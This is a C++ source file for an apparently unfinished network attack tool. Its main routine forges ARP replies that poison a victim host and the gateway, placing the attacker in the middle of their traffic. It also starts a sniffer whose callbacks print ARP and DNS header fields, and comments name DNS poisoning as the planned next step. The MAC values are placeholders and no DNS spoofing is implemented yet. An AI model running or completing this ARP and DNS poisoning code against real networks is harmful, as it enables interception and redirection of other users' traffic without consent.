#include <iostream>

#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "NetworkEngine.h"
#include "UdpStack.h"

#include "dns.h"

void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet);
void dnsCallback(const struct pcap_pkthdr *header, const unsigned char *packet);

// get the interface name, ip of gateway and ip of victim
// main program we need: interface name, ip of gateway, ip of victim
// dns poison we need: domain to poison, what to poison too
int main(int argc, const char *argv[]) {
    // get this from the config file later
    const char *interfaceName = "wlp59s0";
    int ifindex;
    int arpSocket;

    unsigned char attackerMac[ETH_ALEN] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    unsigned char victimMac[ETH_ALEN];
    unsigned char gatewayMac[ETH_ALEN];

    struct in_addr victimIp;
    struct in_addr gatewayIp;
    struct arp_header victimArp;
    struct arp_header gatewayArp;

    memcpy(victimMac, attackerMac, 6);
    memcpy(gatewayMac, attackerMac, 6);

    // get the mac and ip addresses of the victim and the gateway
    victimIp.s_addr = 0x010a000a;
    gatewayIp.s_addr = 0x020a000a;

    // forge the arp packets as these should never change
    forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
    forgeArp(attackerMac, &victimIp, gatewayMac, &gatewayIp, &gatewayArp);

    NetworkEngine ipEngine(interfaceName);

    ipEngine.LoopCallbacks.push_back(dnsCallback);
    ipEngine.startSniff(NetworkEngine::IP_FILTER);

    ipEngine.sendArp(victimArp);
    ipEngine.sendArp(gatewayArp);

    return 0;
}

/*
 * Simple callback that just displays some basic arp fields as a proof-of-concept
 */
void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet) {
    int i;
    struct arp_header *arpheader = NULL;
    arpheader = (struct arp_header *)(packet + 14);

    printf("\n\nReceived Packet Size: %d bytes\n", header->len);
    printf("Hardware type: %s\n", (ntohs(arpheader->arp_hd) == 1) ? "Ethernet" : "Unknown");
    printf("Protocol type: %s\n", (ntohs(arpheader->arp_pr) == ETH_P_IP) ? "IPv4" : "Unknown");
    printf("Operation: %s\n",
           (ntohs(arpheader->arp_op) == ARPOP_REPLY) ? "ARP Reply" : "ARP Request");

    /* If is Ethernet and IPv4, print packet contents */
    if (ntohs(arpheader->arp_hd) == ARPHRD_ETHER && ntohs(arpheader->arp_pr) == ETH_P_IP) {
        printf("Sender MAC: ");

        for (i = 0; i < 6; i++)
            printf("%02X:", arpheader->arp_sha[i]);

        printf("\nSender IP: ");

        for (i = 0; i < 4; i++)
            printf("%d.", arpheader->arp_spa[i]);

        printf("\nTarget MAC: ");

        for (i = 0; i < 6; i++)
            printf("%02X:", arpheader->arp_dha[i]);

        printf("\nTarget IP: ");

        for (i = 0; i < 4; i++)
            printf("%d.", arpheader->arp_dpa[i]);

        printf("\n");
    }
}

/*
 * Simple callback that just displays some basic dns fields as a proof-of-concept
 */
void dnsCallback(const struct pcap_pkthdr *header, const unsigned char *packet) {
    iphdr *ip;
    udphdr *udp;
    dnshdr *dns;

    int ipLen = 0;
    int udpLen = 0;
    int dnsLen = 0;

    // get ip hdr size
    ip = (iphdr *)(packet + 14);
    ipLen = ip->ihl * 4;

    // check to see if it is udp
    if (ip->protocol != IPPROTO_UDP) {
        return;
    }

    // get udp hdr and size
    udp = (udphdr *)(packet + 14 + ipLen);
    udpLen = UdpStack::UDP_HDR_LEN;

    // check that it is a dns packet
    if (ntohs(udp->source) != 53 && ntohs(udp->dest) != 53) {
        return;
    }

    // get dns hdr and size
    dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
    dnsLen = ntohs(udp->len) - UdpStack::UDP_HDR_LEN;

    printf("\n\ndns id: %u\n", ntohs(dns->id));
    printf("query or reply: ");
    dns->qr == 1 ? printf("response\n") : printf("query\n");
    printf("number of questions: %u\n", ntohs(dns->qcount));
    printf("number of answer records: %u\n", ntohs(dns->ancount));
    printf("number of name servers: %u\n", ntohs(dns->nscount));
    printf("number of additional records: %u\n\n", ntohs(dns->adcount));
}
